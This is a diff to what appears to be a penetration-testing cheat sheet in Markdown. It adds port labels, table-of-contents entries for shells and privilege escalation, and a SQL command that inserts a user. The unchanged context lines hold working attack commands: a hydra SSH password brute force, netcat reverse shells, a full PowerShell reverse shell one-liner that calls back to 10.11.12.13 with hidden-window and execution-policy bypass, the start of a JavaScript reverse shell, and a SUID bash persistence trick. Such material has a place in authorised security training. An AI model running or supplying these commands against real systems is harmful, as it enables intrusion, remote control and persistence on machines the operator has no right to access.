@@ -31,7 +31,20 @@
   * [EternalBlue](#eternalblue)
   * [SambaCry](#sambacry)
   * [ShellShock via SMTP](#shellshock-via-smtp)
+  * [SQL Injection](#sql-injection)
 * [Maintaining Access](#maintaining-access)
+  * [Python Bind Shell](#python-bind-shell)
+  * [Python Reverse Shell](#python-reverse-shell)
+  * [Bash Reverse Shells](#bash-reverse-shells)
+  * [MSFVenom Reverse Shells](#msfvenom-reverse-shells)
+  * [Netcat Reverse Shells](#netcat-reverse-shells)
+  * [PowerShell Reverse Shell](#powershell-reverse-shell)
+  * [JavaScript Reverse Shell](#javascript-reverse-shell)
+  * [Information to Gather for Privilege Escalation](#information-to-gather-for-privilege-escalation)
+  * [Linux Privilege Escalation](#linux-privilege-escalation)
+  * [Windows Privilege Escalation](#windows-privilege-escalation)
+  * [Juicy Potato](#juicy-potato)
+  * [Persistence](#persistence)
 * [Covering Tracks](#covering-tracks)
 
 ### Reconnaissance
@@ -91,6 +104,8 @@ sudo nmap $TARGET -O -oN scans/$NAME-nmap-os
 ```
 
 #### FTP
+TCP port 21.
+
 I recommend creating and changing directories to a folder called "loot." It's important to stay organized (and you never know when there's something to download).
 ```bash
 mkdir loot
@@ -148,11 +163,13 @@ exit
 ```
 
 #### SSH
+TCP port 22.
 ```bash
 hydra -l root -P /usr/share/wordlists/rockyou.txt  ssh://10.11.12.13
 ```
 
 #### SMTP
+TCP port 25. 
 ```bash
 telnet $TARGET 25
 HELO
@@ -177,6 +194,7 @@ sudo nmap $TARGET -p25 --script smtp-vuln* -oN scans/mailman-nmap-scripts-smtp-v
 ```
 
 #### HTTP
+TCP port 80.
 ```bash
 dirb http://$TARGET
 dirb http://$TARGET:$PORT/ -o scans/$TARGET-dirb-$PORT-common
@@ -221,6 +239,7 @@ sudo nmap $TARGET -p80 --script http-shellshock -oN scans/$TARGET-nmap-scripts-8
 ```
 
 #### POP3
+TCP port 110. 
 ```bash
 telnet $TARGET 110
 USER root
@@ -230,6 +249,7 @@ QUIT
 ```
 
 #### RPC
+TCP port 135.
 ```bash
 rpcclient -U '' $TARGET
 srvinfo
@@ -237,11 +257,13 @@ netshareenum # print the real file-path of shares; good for accurate RCE
 ```
 
 #### NetBIOS
+TCP port 139.
 ```bash
 nbtscan $TARGET
 ```
 
 #### SMB
+TCP port 445.
 ```bash
 smbclient -L //$TARGET/ # list shares
 smbclient -L //$TARGET/ -p $PORT # specify non-standard SMB/Samba port
@@ -278,6 +300,7 @@ sudo nmap $TARGET -p445 --script smb-vuln-cve-2017-7494 --script-args smb-vuln-c
 ```
 
 #### Rsync
+TCP port 873.
 ```bash
 sudo nmap $TARGET -p873 --script rsync-list-modules
 rsync -av rsync://$TARGET/$SHARE --list-only
@@ -285,6 +308,7 @@ rsync -av rsync://$TARGET/$SHARE loot
 ```
 
 #### NFS
+TCP port 2049.
 ```bash
 sudo nmap $TARGET -p111 --script-nfs*
 showmount -e $TARGET
@@ -298,11 +322,13 @@ cat /mnt/FOO/loot.txt
 ```
 
 #### SQL
+TCP port 3306. 
 ```bash
 mysql -u $USER -h $TARGET
 ```
 
 #### RDP
+TCP port 3389.
 ```bash
 sudo nmap $TARGET -p3389 --script rdp-ntlm-info -oN scans/$NAME-nmap-scripts-rdp-ntlm-info
 ```
@@ -544,6 +570,11 @@ USE targetdb;
 SELECT * FROM usertbl;
 ```
 
+Add a new user to a SQL database.
+```sql
+INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
+```
+
 ### Maintaining Access
 #### Python Bind Shell
 ```python
@@ -594,12 +625,12 @@ sudo nc -nv 10.10.10.10 443 -e /bin/bash
 nc -nv 10.10.10.10 443 -e "/bin/bash"
 ```
 
-#### PowerShell Reverse Shells
+#### PowerShell Reverse Shell
 ```bash
 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.11.12.13",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 ```
 
-#### JavaScript Reverse Shells
+#### JavaScript Reverse Shell
 ```javascript
 (function(){
     var net = require("net"),
@@ -731,11 +762,6 @@ Rootbash (Credit: Tib3rius).
 # to resume root-access execute the new binary using -p
 cp /bin/bash /tmp/bash; chown root /tmp/bash; chmod u+s /tmp/bash; chmod o+x /tmp/bash
 /tmp/bash -p
-```
-
-Add a new user to a SQL database.
-```sql
-INSERT INTO targetdb.usertbl(username, password) VALUES ('victor','please');
 ```
 
 Exfil via Netcat.
